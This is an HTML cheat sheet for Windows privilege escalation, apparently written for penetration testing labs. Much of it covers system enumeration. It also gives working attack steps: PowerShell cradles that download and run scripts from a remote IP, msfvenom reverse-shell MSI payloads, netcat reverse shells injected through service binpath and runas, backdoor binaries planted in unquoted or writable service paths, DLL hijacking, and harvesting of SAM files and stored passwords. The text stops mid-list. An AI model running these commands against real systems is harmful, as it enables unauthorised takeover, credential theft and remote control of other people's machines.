<h1>Windows Privilege Escalation</h1>
            
            <div class="tool-row">
                <div class="tool-name" onclick="toggleDetails('win-checks')">Check OS, Patch level, Basic</div>
                <div class="tool-details" id="win-checks">
                    <div class="tool-command">systeminfo</div>
                    <p>Description: Retrieves basic system information.</p>
                    <pre><code>systeminfo</code></pre>
                    <div class="tool-command">Systeminfo | findstr /B /C:"OS Name" /C:"System Type"</div>
                    <p>Description: Filters system information for OS Name and System Type.</p>
                    <pre><code>systeminfo | findstr /B /C:"OS Name" /C:"System Type"</code></pre>
        
                    <h2>Updates</h2>
                    <div class="tool-command">wmic qfe get Caption,Description,HotFixID,InstalledOn</div>
                    <p>Description: Lists installed Windows updates.</p>
                    <pre><code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code></pre>
                    <div class="tool-command">Wmic logicaldisk get caption,description</div>
                    <p>Description: Retrieves information about logical disks.</p>
                    <pre><code>Wmic logicaldisk get caption,description</code></pre>
        
                    <h2>Applications</h2>
                    <div class="tool-command">wmic product get name, version, vendor</div>
                    <p>Description: Lists installed products with their names, versions, and vendors.</p>
                    <pre><code>wmic product get name, version, vendor</code></pre>
                    <div class="tool-command">accesschk.exe -uws "Everyone" "C:\Program Files"</div>
                    <p>Description: Checks permissions for "Everyone" on "C:\Program Files".</p>
                    <pre><code>accesschk.exe -uws "Everyone" "C:\Program Files"</code></pre>
                    <div class="tool-command">Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}</div>
                    <p>Description: Checks for "Everyone" permissions on files in "C:\Program Files".</p>
                    <pre><code>Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}</code></pre>
        
                    <h2>Services</h2>
                    <div class="tool-command">sc query state=all | findstr "SERVICE_NAME:"</div>
                    <p>Description: Lists all services with their service names.</p>
                    <pre><code>sc query state=all | findstr "SERVICE_NAME:"</code></pre>
                    <div class="tool-command">wmic service get name,displayname,pathname,startmode</div>
                    <p>Description: Retrieves details of services including name, display name, pathname, and start mode.</p>
                    <pre><code>wmic service get name,displayname,pathname,startmode</code></pre>
                    <div class="tool-command">Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}</div>
                    <p>Description: Lists running services with their names and pathnames.</p>
                    <pre><code>Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}</code></pre>
        
                    <h2>Volume</h2>
                    <div class="tool-command">mountvol</div>
                    <p>Description: Displays or specifies a volume mount point.</p>
                    <pre><code>mountvol</code></pre>
        
                    <h2>Drivers - in PowerShell</h2>
                    <div class="tool-command">driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path</div>
                    <p>Description: Lists drivers with detailed information.</p>
                    <pre><code>driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path</code></pre>
                    <div class="tool-command">Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}</div>
                    <p>Description: Retrieves details about signed drivers for VMware devices.</p>
                    <pre><code>Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}</code></pre>
        
                    <h2>Current User Info</h2>
                    <div class="tool-command">whoami</div>
                    <p>Description: Displays the current user.</p>
                    <pre><code>whoami</code></pre>
                    <div class="tool-command">echo %USERNAME%</div>
                    <p>Description: Displays the username of the current user.</p>
                    <pre><code>echo %USERNAME%</code></pre>
        
                    <h2>Privileges and Groups</h2>
                    <div class="tool-command">whoami /priv</div>
                    <p>Description: Lists user privileges.</p>
                    <pre><code>whoami /priv</code></pre>
                    <div class="tool-command">whoami /groups</div>
                    <p>Description: Lists user groups.</p>
                    <pre><code>whoami /groups</code></pre>
                    <div class="tool-command">whoami /all</div>
                    <p>Description: Lists all user information.</p>
                    <pre><code>whoami /all</code></pre>
                    <div class="tool-command">net user</div>
                    <p>Description: Lists all user accounts.</p>
                    <pre><code>net user</code></pre>
                    <div class="tool-command">net localgroup</div>
                    <p>Description: Lists local groups.</p>
                    <pre><code>net localgroup</code></pre>
                    <div class="tool-command">net user /domain</div>
                    <p>Description: Lists users in the domain.</p>
                    <pre><code>net user /domain</code></pre>
                    <div class="tool-command">net group /domain</div>
                    <p>Description: Lists groups in the domain.</p>
                    <pre><code>net group /domain</code></pre>
                    <div class="tool-command">net group /domain &lt;Group Name&gt;</div>
                    <p>Description: Lists members of a specific domain group.</p>
                    <pre><code>net group /domain &lt;Group Name&gt;</code></pre>
                </div>
            </div>
            <div class="tool-row">
                <div class="tool-name" onclick="toggleDetails('win-firewall-av-defender')">Firewall / AV / Defender</div>
                <div class="tool-details" id="win-firewall-av-defender">
                    <div class="tool-command">Example command: <code>netsh firewall show state</code></div>
                    <p>Description of this technique for Windows.</p>
                    <ul>
                        <li><code>netsh firewall show state</code></li>
                        <li><code>netsh firewall show config</code></li>
                        <li><code>sc query windefend</code></li>
                        <li><code>netsh advfirewall firewall dump</code></li>
                    </ul>
                </div>
            </div>
            <div class="tool-row">
                <div class="tool-name" onclick="toggleDetails('win-network')">Network</div>
                <div class="tool-details" id="win-network">
                    <div class="tool-command">Example command: <code>ipconfig /all</code></div>
                    <p>Description of network-related commands for Windows.</p>
                    <ul>
                        <li><code>ipconfig /all</code></li>
                        <li><code>route print</code></li>
                        <li><code>arp -A</code></li>
                    </ul>
                </div>
            </div>
            <div class="tool-row">
                <div class="tool-name" onclick="toggleDetails('win-checklist-tools')">Checklist Automated Tools</div>
                <div class="tool-details" id="win-checklist-tools">
                    <p>Run the following automated tools and commands for a comprehensive checklist:</p>
                    <ul>
                        <li><code>Run winpeas</code></li>
                        <li><code>Run PowerUp.ps1</code></li>
                        <li><code>powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.155/PowerUp.ps1');Invoke-AllChecks"</code></li>
                        <li><code>Run Sherlock.ps1</code></li>
                        <li><code>powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.155/Sherlock.ps1');Find-AllVulns"</code></li>
                        <li><code>accesschk.exe /accepteula -wvu</code></li>
                        <li><code>Folder Perms:</code></li>
                        <ul>
                            <li><code>\\192.168.119.155\test\accesschk.exe /accepteula -uwdqs "Authenticated Users" C:\</code></li>
                            <li><code>\\192.168.119.155\test\accesschk.exe /accepteula -uwdqs "Everyone" C:\</code></li>
                        </ul>
                        <li><code>File Perms:</code></li>
                        <ul>
                            <li><code>\\192.168.119.155\test\accesschk.exe /accepteula -uwqs "Authenticated Users" C:\*.*</code></li>
                            <li><code>\\192.168.119.155\test\accesschk.exe /accepteula -uwdqs "Everyone" C:\*.*</code></li>
                        </ul>
                        <li><code>Run JAWS</code></li>
                        <li><code>Executables:</code></li>
                        <ul>
                            <li><code>WinPEAS.exe /.bat *</code></li>
                            <li><code>Seatbelt.exe</code></li>
                            <li><code>Watson.exe *</code></li>
                            <li><code>Sharpup.exe</code></li>
                            <li><code>windows-privesc-check2.exe --dump -G</code></li>
                        </ul>
                        <li><code>Powershell:</code></li>
                        <ul>
                            <li><code>Sherlock.ps1 *</code></li>
                            <li><code>PowerUp.ps1 *</code></li>
                            <li><code>jaws-enumps1 *</code></li>
                        </ul>
                        <li><code>Other:</code></li>
                        <ul>
                            <li><code>Windows-exploit-suggester.py *</code></li>
                            <li><code>Systeminfo -> a text file and run it with windows exploit suggester.py, search for exploit in SecWiki github</code></li>
                            <li><code>MSF exploit suggester *</code></li>
                            <li><code>In a meterpreter session – run /post/multi/recon/local_exploit_suggester - > shows list of kernel</code></li>
                        </ul>
                    </ul>
                </div>
            </div>
            <div class="tool-row">
                <div class="tool-name" onclick="toggleDetails('win-installed-apps-services')">Installed Applications and Services</div>
                <div class="tool-details" id="win-installed-apps-services">
                    <p>Use the following commands to gather information about installed applications and services:</p>
                    <ul>
                        <li><code>tasklist /SVC</code> - List running processes and their associated services.</li>
                        <li><code>net start</code> - List Windows services that are currently started.</li>
                        <li><code>DRIVERQUERY</code> - Look for 3rd party drivers.</li>
                        <li><code>wmic /?</code> - Check if WMIC is allowed on a low privilege shell (mostly allowed on Win7/Win8).</li>
                        <li><code>Automated WMIC info:</code> <a href="https://www.fuzzysecurity.com/tutorials/files/wmic_info.rar">WMIC Info Tutorial</a></li>
                        <li><code>wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."</code> - Get Windows updates information.</li>
                        <li><code>cacls "C:\Python27"</code> - Check directory permissions.</li>
                    </ul>
                </div>
            </div>
            <div class="tool-row">
                <div class="tool-name" onclick="toggleDetails('win-scheduled-tasks')">Scheduled Tasks</div>
                <div class="tool-details" id="win-scheduled-tasks">
                    <p>Use the following commands to gather information about scheduled tasks:</p>
                    <ul>
                        <li><code>schtasks /query /fo LIST /v</code> - Query scheduled tasks and save to <code>schtasks.txt</code> locally. Then run:
                            <pre>cat schtasks.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM</pre>
                        </li>
                        <li><code>dir %SystemRoot%\Tasks</code> - List scheduled tasks in the default directory.</li>
                        <li><code>e.g. c:\windows\tasks\</code> - Alternate location for scheduled tasks.</li>
                        <li><code>e.g. c:\windows\system32\tasks\</code> - Alternate location for scheduled tasks.</li>
                        <li><code>accesschk.exe -dqv "E:\GrabLogs"</code> - Check permissions on the scheduled tasks binary directory.</li>
                        <li><code>copy evil-tftp.exe E:\GrabLogs\tftp.exe</code> - If write permissions are available, copy a file to the scheduled tasks directory.</li>
                    </ul>
                </div>
            </div>
            <div class="tool-row">
                <div class="tool-name" onclick="toggleDetails('win-startups-autoruns')">Startups and Autoruns</div>
                <div class="tool-details" id="win-startups-autoruns">
                    <p>Use the following commands to gather information about startup programs and autoruns:</p>
                    <ul>
                        <li><code>reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code> - Query the registry for startup programs set for the current user.</li>
                        <li><code>reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run</code> - Query the registry for startup programs set for all users.</li>
                        <li><code>wmic startup get caption,command</code> - List startup programs and their commands.</li>
                        <li><code>reg query HKLM\Software\Microsoft\Windows\CurrentVersion\R</code> - Query the registry for autorun entries.</li>
                        <li><code>reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce</code> - Query the registry for one-time run entries for the current user.</li>
                        <li><code>dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"</code> - List startup programs for all users.</li>
                        <li><code>dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"</code> - List startup programs for the current user.</li>
                        <li><code>accesschk64.exe /accepteula -wvu "C:\Program Files\Autorun Program"</code> - Check access permissions on startup directories. If writable, you can place malicious binaries.</li>
                    </ul>
                </div>
            </div>
            <div class="tool-row">
                <div class="tool-name" onclick="toggleDetails('service-permissions')">Service Permissions</div>
                <div class="tool-details" id="service-permissions">
                    <div class="tool-command">Check if service config can be modified:</div>
                    <pre><code>accesschk.exe /accepteula</code></pre>
                    <pre><code>accesschk.exe -uwcqv "Authenticated Users" * /accepteula</code></pre>
                    <pre><code>accesschk.exe -ucqv &lt;Service Name&gt;</code></pre>
        
                    <div class="tool-command">Get service details:</div>
                    <pre><code>sc qc &lt;Service Name&gt;</code></pre>
        
                    <div class="tool-command">Check service with weak file permission:</div>
                    <pre><code>wmic.exe</code></pre>
                    <pre><code>for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt</code></pre>
                    <pre><code>for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"</code></pre>
        
                    <pre><code>sc.exe</code></pre>
                    <pre><code>sc query state= all | findstr "SERVICE_NAME:" >> Servicenames.txt</code></pre>
                    <pre><code>FOR /F %i in (Servicenames.txt) DO echo %i</code></pre>
                    <pre><code>type Servicenames.txt</code></pre>
                    <pre><code>FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt</code></pre>
                    <pre><code>FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt</code></pre>
                </div>
            </div>
            <div class="tool-row">
                <div class="tool-name" onclick="toggleDetails('unquoted-service-path')">Unquoted Service Path</div>
                <div class="tool-details" id="unquoted-service-path">
                    <div class="tool-command">Find unquoted service paths:</div>
                    <pre><code>wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """</code></pre>
        
                    <div class="tool-command">Check service configuration:</div>
                    <pre><code>sc query</code></pre>
                    <pre><code>sc qc &lt;service name&gt;</code></pre>
                </div>
            </div>
            <!-- AlwaysInstallElevated Content -->
            <div class="tool-row">
                <div class="tool-name" onclick="toggleDetails('alwaysinstall-elevated')">AlwaysInstallElevated</div>
                <div class="tool-details" id="alwaysinstall-elevated">
                    <div class="tool-command">Check AlwaysInstallElevated settings:</div>
                    <pre><code>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\</code></pre>
                    <pre><code>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\</code></pre>

                    <div class="tool-command">If AlwaysInstallElevated = 1, create an MSI payload:</div>
                    <pre><code>msfvenom -p windows/shell_reverse_tcp lhost=&lt;LHOST&gt; lport=&lt;LPORT&gt; -f msi -o setup.msi</code></pre>
                    <pre><code>msiexec /quiet /qn /i C:\Temp\setup.msi</code></pre>
                </div>
            </div>
            <!-- Service only available from inside Content -->
            <div class="tool-row">
                <div class="tool-name" onclick="toggleDetails('service-inside')">Service only available from inside</div>
                <div class="tool-details" id="service-inside">
                    <div class="tool-command">Check open ports:</div>
                    <pre><code>netstat -ano</code></pre>

                    <div class="tool-command">Upload plink.exe:</div>
                    <pre><code>plink.exe -R "remote port":127.0.0.1:"local port" root@"ipaddress"</code></pre>
                </div>
            </div>
            <!-- Password in files Content -->
            <div class="tool-row">
                <div class="tool-name" onclick="toggleDetails('password-files')">Password in files</div>
                <div class="tool-details" id="password-files">
                    <div class="tool-command">Check for saved credentials:</div>
                    <pre><code>cmdkey /list</code></pre>
                    <pre><code>runas /savecred /user:ACCESS\Administrator "c:\windows\system32\cmd.exe /c \\IP\share\nc.exe -nv 10.10.14.2 80 -e cmd.exe"</code></pre>

                    <div class="tool-command">Check for SAM files:</div>
                    <pre><code>%SYSTEMROOT%\repair\SAM</code></pre>
                    <pre><code>%SYSTEMROOT%\System32\config\RegBack\SAM</code></pre>
                    <pre><code>%SYSTEMROOT%\System32\config\SAM</code></pre>
                    <pre><code>%SYSTEMROOT%\repair\system</code></pre>
                    <pre><code>%SYSTEMROOT%\System32\config\SYSTEM</code></pre>
                    <pre><code>%SYSTEMROOT%\System32\config\RegBack\system</code></pre>

                    <div class="tool-command">Search for passwords in files:</div>
                    <pre><code>findstr /si password *.txt</code></pre>
                    <pre><code>findstr /si password *.xml</code></pre>
                    <pre><code>findstr /si password *.ini</code></pre>
                    <pre><code>findstr /si password *.config</code></pre>
                    <pre><code>findstr /si pass/pwd *.ini</code></pre>

                    <div class="tool-command">Search for files with specific patterns:</div>
                    <pre><code>dir /s *pass* == *cred* == *vnc* == *.config*</code></pre>
                    <pre><code>findstr /spin "password" *.*</code></pre>

                    <div class="tool-command">Unattended config files:</div>
                    <pre><code>c:\sysprep.inf</code></pre>
                    <pre><code>c:\sysprep\sysprep.xml</code></pre>
                    <pre><code>c:\unattend.xml</code></pre>
                    <pre><code>%WINDIR%\Panther\Unattend\Unattended.xml</code></pre>
                    <pre><code>%WINDIR%\Panther\Unattended.xml</code></pre>

                    <div class="tool-command">Search for unattended and config files:</div>
                    <pre><code>dir /b /s unattend.xml</code></pre>
                    <pre><code>dir /b /s web.config</code></pre>
                    <pre><code>dir /b /s sysprep.inf</code></pre>
                    <pre><code>dir /b /s sysprep.xml</code></pre>
                    <pre><code>dir /b /s *pass*</code></pre>
                    <pre><code>dir c:\*vnc.ini /s /b</code></pre>
                    <pre><code>dir c:\*ultravnc.ini /s /b</code></pre>
                    <pre><code>dir c:\ /s /b | findstr /si *vnc.ini</code></pre>
                </div>
            </div>
            <!-- Registry Content -->
            <div class="tool-row">
                <div class="tool-name" onclick="toggleDetails('registry')">Registry</div>
                <div class="tool-details" id="registry">
                    <div class="tool-command">VNC:</div>
                    <pre><code>reg query "HKCU\Software\ORL\WinVNC3\Password"</code></pre>
                    <pre><code>reg query "HKCU\Software\TightVNC\Server"</code></pre>

                    <div class="tool-command">Windows Autologin:</div>
                    <pre><code>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"</code></pre>
                    <pre><code>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"</code></pre>

                    <div class="tool-command">SNMP Parameters:</div>
                    <pre><code>reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"</code></pre>

                    <div class="tool-command">Putty:</div>
                    <pre><code>reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"</code></pre>

                    <div class="tool-command">Search for Password in Registry:</div>
                    <pre><code>reg query HKLM /f password /t REG_SZ /s</code></pre>
                    <pre><code>reg query HKCU /f password /t REG_SZ /s</code></pre>
                </div>
            </div>
            <!-- REGSVC ACL Content -->
            <div class="tool-row">
                <div class="tool-name" onclick="toggleDetails('regsvc-acl')">REGSVC ACL</div>
                <div class="tool-details" id="regsvc-acl">
                    <div class="tool-command">Check for Registry Services:</div>
                    <pre><code>Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl</code></pre>
                    
                    <div class="tool-command">Look for Access Group Permissions for NT AUTH/Interactive:</div>
                    <pre><code># Check the permissions</code></pre>

                    <div class="tool-command">Create a New Window Service Binary:</div>
                    <pre><code>x86_64-w64-mingw32-gcc windows_service.c -o x.exe</code></pre>

                    <div class="tool-command">Add to the Registry Path:</div>
                    <pre><code>reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f</code></pre>

                    <div class="tool-command">Execute Using:</div>
                    <pre><code>sc start regsvc</code></pre>
                </div>
            </div>
            <!-- Unquoted Service Path Exploitation Content -->
            <div class="tool-row">
                <div class="tool-name" onclick="toggleDetails('unquoted-service-path')">Unquoted Service Path Exploitation</div>
                <div class="tool-details" id="unquoted-service-path">
                    <h3>Case 1: SeShutdownPrivilege Listed</h3>
                    <div class="tool-command">Search for Services that Auto Start:</div>
                    <pre><code>wmic service get name,displayname,pathname,startmode | findstr /i "auto"</code></pre>

                    <div class="tool-command">Search for Non-Standard Services:</div>
                    <pre><code>wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"</code></pre>

                    <div class="tool-command">Potential Unquoted Service Example:</div>
                    <pre><code>Heisenburg Service   heisenburgsvc     "C:\Program Files\Heisenburg\The One Who\knocks.exe"        auto</code></pre>

                    <div class="tool-command">Check Permissions on Subdirectories:</div>
                    <pre><code>icacls "C:\"</code></pre>
                    <pre><code>icacls "C:\Program Files"</code></pre>
                    <pre><code>icacls "C:\Program Files\Heisenburg"</code></pre>

                    <div class="tool-command">Example Output for Access Permissions:</div>
                    <pre><code>BUILTIN\Users:(F)</code></pre>
                    <pre><code>BUILTIN\Users:(I)(RX)</code></pre>

                    <div class="tool-command">Create Reverse Shell Binary and Copy:</div>
                    <pre><code>copy %temp%\backdoor.exe "C:\Program Files\Heisenburg\The.exe"</code></pre>

                    <div class="tool-command">Reboot to Have the Service Auto Start:</div>
                    <pre><code>shutdown /r /t 0</code></pre>

                    <h3>Case 2: SeShutdownPrivilege Disabled</h3>
                    <div class="tool-command">Search for Manual Start Services:</div>
                    <pre><code>wmic service get name,displayname,pathname,startmode | findstr /i "manual" | findstr /i /v "c:\windows"</code></pre>

                    <div class="tool-command">Potential Unquoted Service Example:</div>
                    <pre><code>Heisenburg Service   heisenburgsvc     "C:\Program Files\Heisenburg\The One Who\knocks.exe"        manual</code></pre>

                    <div class="tool-command">Check Service Privileges:</div>
                    <pre><code>.\accesschk.exe /accepteula -ucqv user heisenburgsvc</code></pre>

                    <div class="tool-command">Check Permissions on Subdirectories:</div>
                    <pre><code>icacls "C:\"</code></pre>
                    <pre><code>icacls "C:\Program Files"</code></pre>
                    <pre><code>icacls "C:\Program Files\Heisenburg"</code></pre>

                    <div class="tool-command">Example Output for Access Permissions:</div>
                    <pre><code>BUILTIN\Users:(F)</code></pre>
                    <pre><code>BUILTIN\Users:(I)(RX)</code></pre>

                    <div class="tool-command">Handle Spaces in Path:</div>
                    <pre><code>copy %temp%\backdoor.exe "C:\Program Files\Heisenburg\The.exe"</code></pre>

                    <div class="tool-command">Start Netcat Listener and Service:</div>
                    <pre><code>net start heisenburgsvc</code></pre>
                    <pre><code># net stop heisenburgsvc first if the service is already running.</code></pre>
                </div>
            </div>
            <!-- Weak Service Permissions Exploitation Content -->
            <div class="tool-row">
                <div class="tool-name" onclick="toggleDetails('weak-service-permissions')">Weak Service Permissions Exploitation</div>
                <div class="tool-details" id="weak-service-permissions">
                    <h3>Download Accesschk</h3>
                    <div class="tool-command">Download accesschk.exe from:</div>
                    <pre><code>https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe</code></pre>

                    <h3>List Access for All Services</h3>
                    <div class="tool-command">List access for all services:</div>
                    <pre><code>.\accesschk.exe /accepteula -uwcqv "Authenticated Users" *</code></pre>
                    <pre><code># or: .\accesschk.exe /accepteula -uwcqv user *</code></pre>

                    <div class="tool-command">Example Output:</div>
                    <pre><code>$ RW SSDPSRV</code></pre>
                    <pre><code>$ SERVICE_ALL_ACCESS</code></pre>
                    <pre><code>$ RW upnphost</code></pre>
                    <pre><code>$ SERVICE_ALL_ACCESS</code></pre>

                    <h3>Service Configuration</h3>
                    <div class="tool-command">List Current Config for the Service:</div>
                    <pre><code>sc qc upnphost</code></pre>

                    <div class="tool-command">Check START TYPE and SERVICE_START_NAME:</div>
                    <pre><code># START_TYPE         : 3   DEMAND_START</code></pre>
                    <pre><code># SERVICE_START_NAME : NT AUTHORITY\LocalService</code></pre>

                    <div class="tool-command">Change BinPath with Payload:</div>
                    <pre><code>sc config "upnphost" binpath= "C:\WINDOWS\Temp\nc.exe 192.168.119.147 443 -e C:\WINDOWS\System32\cmd.exe"</code></pre>

                    <div class="tool-command">Remove Dependencies (if any):</div>
                    <pre><code>sc config "upnphost" depend= ""</code></pre>

                    <div class="tool-command">Set to Run from System Account:</div>
                    <pre><code>sc config "upnphost" obj= ".\LocalSystem" password= ""</code></pre>

                    <div class="tool-command">Start Netcat Listener and Service:</div>
                    <pre><code>net start "upnphost"</code></pre>
                    <pre><code># net stop "upnphost" first if the service is already running.</code></pre>
                </div>
            </div>
            <!-- Weak Service Executable File Permissions Exploitation Content -->
            <div class="tool-row">
                <div class="tool-name" onclick="toggleDetails('weak-service-executable-permissions')">Weak Service Executable File Permissions Exploitation</div>
                <div class="tool-details" id="weak-service-executable-permissions">
                    <h3>Verify Overwrite Permissions on Service Binary</h3>
                    <div class="tool-command">Check if we can overwrite an existing service binary file:</div>
                    <pre><code>icacls "C:\Program Files\Heisenburg\knocks.exe"</code></pre>
                    <pre><code># or .\accesschk.exe /accepteula -uvwq "C:\Program Files\Heisenburg\knocks.exe"</code></pre>

                    <div class="tool-command">Example Output if (builtin\users or EVERYONE) has ( (I) or (F) ) on "C:\Program Files\Heisenburg":</div>
                    <pre><code>Everyone:(F)</code></pre>
                    <pre><code>BUILTIN\Users:(I)(RX)</code></pre>
                    <pre><code># Example output for accesschk.exe:</code></pre>
                    <pre><code># RW BUILTIN\Users</code></pre>
                    <pre><code># FILE_ALL_ACCESS</code></pre>

                    <h3>Exploit the Permissions</h3>
                    <div class="tool-command">Backup Original Executable:</div>
                    <pre><code>copy "C:\Program Files\Heisenburg\knocks.exe" C:\Temp\</code></pre>

                    <div class="tool-command">Create Reverse Shell Binary and Overwrite Existing File:</div>
                    <pre><code>copy /Y C:\Temp\backdoor.exe "C:\Program Files\Heisenburg\knocks.exe"</code></pre>

                    <div class="tool-command">Start Netcat Listener and Service:</div>
                    <pre><code>net start "heisenburgsvc"</code></pre>
                    <pre><code># net stop "heisenburgsvc" first if the service is already running.</code></pre>
                </div>
            </div>
            <!-- AlwaysInstallElevated Privilege Escalation Content -->
            <div class="tool-row">
                <div class="tool-name" onclick="toggleDetails('always-install-elevated')">AlwaysInstallElevated Privilege Escalation</div>
                <div class="tool-details" id="always-install-elevated">
                    <h3>Check AlwaysInstallElevated Registry Values</h3>
                    <div class="tool-command">Verify if both registry keys contain "AlwaysInstallElevated" value 0x1:</div>
                    <pre><code>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code></pre>
                    <pre><code>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code></pre>

                    <h3>Exploit AlwaysInstallElevated</h3>
                    <div class="tool-command">Generate Reverse Shell MSI Payload:</div>
                    <pre><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;MY-IP&gt; LPORT=&lt;MY-PORT&gt; -f msi -o shell.msi</code></pre>

                    <div class="tool-command">Copy the Binary Over to Target, Start a Listener, and Execute:</div>
                    <pre><code>msiexec /quiet /qn /i C:\Temp\shell.msi</code></pre>
                </div>
            </div>
            <!-- DLL Hijacking Content -->
            <div class="tool-row">
                <div class="tool-name" onclick="toggleDetails('dll-hijacking')">DLL Hijacking</div>
                <div class="tool-details" id="dll-hijacking">
                    <h3>Understanding DLL Search Order</h3>
                    <p>You can see the DLL search order on 32-bit systems below:</p>
                    <ol>
                        <li>The directory from which the application loaded</li>
                        <li>32-bit System directory (C:\Windows\System32)</li>
                        <li>16-bit System directory (C:\Windows\System)</li>
                        <li>Windows directory (C:\Windows)</li>
                        <li>The current working directory (CWD)</li>
                        <li>Directories in the PATH environment variable (system then user)</li>
                    </ol>
                    <p>As a low privilege user, we have little hope of putting a malicious DLL in directories 1-4. Directory 5 is not a possibility in this case because we are dealing with a Windows service, but if we have write access to any of the directories in the Windows PATH, we can exploit this.</p>

                    <h3>Check Path Environment Variable</h3>
                    <div class="tool-command">Check the PATH environment variable:</div>
                    <pre><code>echo %path%</code></pre>

                    <h3>Check Access Permissions</h3>
                    <div class="tool-command">Check access permissions with accesschk or cacls:</div>
                    <pre><code>accesschk.exe -dqv "C:\Python27"</code></pre>
                    <pre><code>cacls "C:\Python27"</code></pre>

                    <h3>Exploit DLL Hijacking</h3>
                    <div class="tool-command">Check the status of the IKEEXT service to ensure it is set to AUTO_START:</div>
                    <pre><code>sc qc IKEEXT</code></pre>
                    
                    <div class="tool-command">Copy the malicious DLL and restart the service:</div>
                    <pre><code>copy evil.dll C:\Python27\wlbsctrl.dll</code></pre>
                    <pre><code>Restart</code></pre>
                </div>
            </div>
            <!-- Stored Credentials Content -->
            <div class="tool-row">
                <div class="tool-name" onclick="toggleDetails('stored-credentials')">Stored Credentials</div>
                <div class="tool-details" id="stored-credentials">
                    <h3>Check for Saved Credentials</h3>
                    <div class="tool-command">List saved credentials:</div>
                    <pre><code>cmdkey /list</code></pre>

                    <h3>Use Saved Credentials</h3>
                    <div class="tool-command">If saved credentials exist, use <code>runas</code> to execute as that user:</div>
                    <pre><code>runas /savedcred /user:&lt;USERNAME-OF-SAVED-CRED&gt; C:\Temp\backdoor.exe</code></pre>
                </div>
            </div>
            <!-- Get Passwords from Windows Registry Content -->
            <div class="tool-row">
                <div class="tool-name" onclick="toggleDetails('registry-passwords')">Get Passwords from Windows Registry</div>
                <div class="tool-details" id="registry-passwords">
                    <h3>Autologon Credentials</h3>
                    <div class="tool-command">Retrieve autologon credentials:</div>
                    <pre><code>Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | select "Default*"</code></pre>
                    <div class="tool-command">Alternatively, use:</div>
                    <pre><code>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"</code></pre>

                    <h3>VNC Password</h3>
                    <div class="tool-command">Retrieve VNC password:</div>
                    <pre><code>reg query "HKCU\Software\ORL\WinVNC3\Password"</code></pre>

                    <h3>SNMP Parameters</h3>
                    <div class="tool-command">Retrieve SNMP parameters:</div>
                    <pre><code>reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"</code></pre>

                    <h3>Putty Sessions</h3>
                    <div class="tool-command">Retrieve Putty session information:</div>
                    <pre><code>reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"</code></pre>
                </div>
            </div>
            <!-- Search for Password in Registry Content -->
            <div class="tool-row">
                <div class="tool-name" onclick="toggleDetails('search-registry-passwords')">Search for Password in Registry</div>
                <div class="tool-details" id="search-registry-passwords">
                    <h3>Search for Passwords in Registry</h3>
                    <div class="tool-command">Search for passwords in HKLM (HKEY_LOCAL_MACHINE):</div>
                    <pre><code>reg query HKLM /f password /t REG_SZ /s</code></pre>

                    <div class="tool-command">Search for passwords in HKCU (HKEY_CURRENT_USER):</div>
                    <pre><code>reg query HKCU /f password /t REG_SZ /s</code></pre>
                </div>
            </div>
            <!-- Files That May Contain Passwords Content -->
            <div class="tool-row">
                <div class="tool-name" onclick="toggleDetails('files-passwords')">Files That May Contain Passwords</div>
                <div class="tool-details" id="files-passwords">
                    <h3>Files That May Contain Passwords</h3>
                    <div class="tool-command">Common Locations:</div>
                    <pre><code>c:\sysprep.inf</code></pre>
